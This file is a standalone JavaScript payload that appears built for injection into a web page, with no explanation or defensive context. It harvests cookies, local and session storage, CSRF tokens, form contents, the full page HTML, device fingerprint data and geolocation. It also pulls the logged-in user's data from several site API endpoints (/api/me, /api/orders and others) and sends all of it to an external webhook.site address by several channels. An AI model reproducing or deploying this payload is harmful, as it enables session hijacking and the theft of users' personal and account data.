(function() {
  const data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: window.location.href,
    referrer: document.referrer,
    title: document.title,
    html: document.documentElement.outerHTML,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    maxTouchPoints: navigator.maxTouchPoints,
    screen: screen.width + 'x' + screen.height,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    plugins: [].map.call(navigator.plugins, function(p) { return p.name; }),
    me: null,
    ports: null,
    orders: null,
    tariffs: null,
    rates: null,
    csrf: [],
    forms: {},
    links: [],
    images: [],
    scripts: [],
    meta: {},
    websockets: [],
    geo: null
  };

  try {
    fetch('/api/me', { credentials: 'include' })
      .then(function(r) { return r.json(); })
      .then(function(d) { data.me = d; })
      .catch(function() {});
  } catch (e) {}

  try {
    fetch('/api/ports', { credentials: 'include' })
      .then(function(r) { return r.json(); })
      .then(function(d) { data.ports = d; })
      .catch(function() {});
  } catch (e) {}

  try {
    fetch('/api/orders', { credentials: 'include' })
      .then(function(r) { return r.json(); })
      .then(function(d) { data.orders = d; })
      .catch(function() {});
  } catch (e) {}

  try {
    fetch('/api/tariffs', { credentials: 'include' })
      .then(function(r) { return r.json(); })
      .then(function(d) { data.tariffs = d; })
      .catch(function() {});
  } catch (e) {}

  try {
    fetch('/api/rates', { credentials: 'include' })
      .then(function(r) { return r.json(); })
      .then(function(d) { data.rates = d; })
      .catch(function() {});
  } catch (e) {}

  var csrfTokens = [];
  document.querySelectorAll('input[name*="csrf"], input[name*="token"], meta[name*="csrf"]').forEach(function(el) {
    csrfTokens.push(el.value || el.content);
  });
  data.csrf = csrfTokens;

  document.querySelectorAll('form').forEach(function(form, i) {
    var formData = new FormData(form);
    var entries = {};
    for (var pair of formData.entries()) {
      entries[pair[0]] = pair[1];
    }
    data.forms[i] = entries;
  });

  document.querySelectorAll('a').forEach(function(a) {
    data.links.push(a.href);
  });

  document.querySelectorAll('img').forEach(function(img) {
    data.images.push(img.src);
  });

  document.querySelectorAll('script').forEach(function(s) {
    if (s.src) data.scripts.push(s.src);
  });

  document.querySelectorAll('meta').forEach(function(m) {
    data.meta[m.name] = m.content;
  });

  var wsUrls = [];
  document.querySelectorAll('*').forEach(function(el) {
    if (el.src && el.src.startsWith('ws')) wsUrls.push(el.src);
    if (el.href && el.href.startsWith('ws')) wsUrls.push(el.href);
  });
  data.websockets = wsUrls;

  function send() {
    var payload = encodeURIComponent(JSON.stringify(data));
    var webhook = 'https://webhook.site/4af52c09-667c-425f-9767-f20efcf8aef0';
    new Image().src = webhook + '?all=' + payload;
    navigator.sendBeacon(webhook + '?all=' + payload);
    try {
      fetch(webhook + '?all=' + payload, { mode: 'no-cors' });
    } catch (e) {}
  }

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        data.geo = pos.coords;
        send();
      },
      function() {
        send();
      }
    );
  } else {
    send();
  }

  setTimeout(send, 3000);
})();
